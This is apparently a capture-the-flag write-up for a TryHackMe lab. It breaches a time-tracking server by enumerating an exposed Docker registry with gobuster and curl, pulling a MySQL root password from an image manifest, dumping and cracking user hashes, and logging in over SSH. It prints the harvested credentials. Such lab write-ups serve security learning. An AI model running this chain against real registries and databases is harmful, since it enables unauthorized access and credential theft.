# Umbrella #
### Note: Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerisation.

![alt text](image-2.png)

### https://tryhackme.com/r/room/umbrella ###

---------------------------------------------------------

### RECON: ###

+ Scan the machine with Nmap:

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDafqZxGEa6kz/5SjDuHy4Hs02Ns+hQgiygUqck+jWWnO7A8+mzFovIR0z76dugf8sTv9P6hq++1nNkPvvdovIkCQ00Ci9VrNyRePh9ZjXUf6ohbRLa9bJ45zHSY3Icf56IeuIy3TVn6d05ed5EtaTjAYA8KyCvwm2nDZQ7DH081jnL1g1uJ4aeeA/IlNXYLV610u7lkQem8VwXQWEs7F8JH6RMX8/8oGe7oBnpvKUeACtB9NXN/5tGsiMXqx7+JB8nfpMRIyLiXA7HjV9S7mmtmBduJ5EyfvX5hdwSCEYF1E7/YowqF5KbTpmZeDI9vJharuKqB97iu1h87u1qc37zT7emxD0QxCOAT3mKGXB26u159ZjAvjJ2EUhSjfbgjTx0s0w2bysXJNrpw5oS1AMm/XD6dSCRfg0kS2LzwDFJvv3dCy56bdOdW+Xe/tkBgvNio11OiP8E2qvdZ+cSgnXi+d8m2TkFUJEfavQPES7iXuZ3gMEaVPdbILVz3zRGh58=
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASqbHaEEuWmI5CrkNyO/jnEdfqh2rz9z2bGFBDGoHjs5kyxBKyXoDSq/WBp7fdyvo1tzZdZfJ06LAk5br00eTg=
|   256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDDy2RWM3VB9ZBVO+OjouqVM+inQcilcbI0eM3GAjnoC
3306/tcp open  mysql   syn-ack ttl 62 MySQL 5.7.40
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.40_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-22T10:04:49
| Not valid after:  2032-12-19T10:04:49
| MD5:   c512:bd8c:75b6:afa8:fde3:bc14:0f3e:7764
| SHA-1: 8f11:0b77:1387:0438:fc69:658a:eb43:1671:715c:d421
|
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 7
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsCompression, InteractiveClient, DontAllowDatabaseTableColumn, LongColumnFlag, LongPassword, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: La\x08\x1D;0J\x11B,&\x04\x161D\x0DoKz4
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    syn-ack ttl 62 Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
```
--------------------------------------------------------------
### EXPLOIT DOCKER and MYSQL: ###

+ Try through port 3306: MySQL and port 8080: Login_Page 
--> We can not brute force the credential MySQL and Login_Page.
+ Let look at port 5000: Docker API v2.
+ Scan the diretories port 5000:

```bash
gobuster dir -u http://<IP>:5000/ -w /usr/share/wordlists/dirb/common.txt -t64
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/v2                   (Status: 301) [Size: 39] [--> /v2/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

+ Research the Docker port 5000 with /v2/ and we find out the technique to exploit the Docker.
+ "https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry#discovering".

![alt text](image-3.png)

![alt text](image-4.png)

+ We've taken the repo: "umbrella/timetracking".
+ Now we will be using curl to enumerate. 

```bash
curl -s http://10.10.188.207:5000/v2/umbrella/timetracking/manifests/latest
{
   "schemaVersion": 1,
   "name": "umbrella/timetracking",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
....
"history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"node\",\"app.js\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":null},\"container\":\"527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9\",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-12-22T10:03:08.042002316Z\",\"docker_version\":\"20.10.17\",\"id\":\"7aec279d6e756678a51a8f075db1f0a053546364bcf5455f482870cef3b924b4\",\"os\":\"linux\",\"parent\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"throwaway\":true}"
      }
]
 
 ....  ]
} 
```

--> We have the credential MySQL: root:Ng1-f3!Pe7-e5?Nf3xe5
and database name "timetracking".

+ Login again the MySQL:
+ "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands"

![alt text](image-5.png)

+ Access database "timetracking" and we've gotten the all of users:

![alt text](image-6.png)

+ We list each columns of table "users":

![alt text](image-7.png)

+ After have the user and password, we decrypt each passwords and use it to login SSH.
+ We find out the credential which can login SSH successfully: claire-r:Password1







